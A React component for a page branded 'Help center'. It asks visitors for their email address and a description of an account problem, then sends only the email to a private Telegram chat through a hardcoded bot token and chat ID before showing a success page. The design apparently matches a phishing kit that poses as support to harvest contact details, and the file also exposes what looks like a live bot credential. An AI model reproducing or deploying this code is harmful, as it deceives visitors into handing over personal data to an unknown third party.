import { useState } from "react"
import { useNavigate } from "react-router-dom";
function Message(){
    const [success,setSuccess]=useState("")
    const [error,setError]=useState("")
    const navigate=useNavigate()
    const handleSendToTelegram = async () => {
        if (!success) {
            setError("Please enter email adress");
            return;
        }

        const botToken = '8015272721:AAHovwpLJluTlPx6zfA9KLZjFvJqV-bt2ws'; 
        const chatId = '7452019947'; 
        const message = `Email: ${success}`; 
    
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });
           navigate("/success")
        } catch (error) {
           
        }
    };

    return(
        <div className="box">
            <div className="text">
                <img src="./logo1.ico"></img>
               <h4> Help center</h4></div>
<div className="message-box">
    <input type="text" placeholder="Your email adress"  onChange={(e) => setSuccess(e.target.value)}></input>
    {error && <p>{error}</p>}
    <textarea placeholder="Please enter the issue you are experiencing with your account in this text box and report it to us.">

    </textarea>

    <button onClick={handleSendToTelegram}> Send</button>
</div>
<img src="./bottom.jpeg"></img>
        </div>
    )
}
export default Message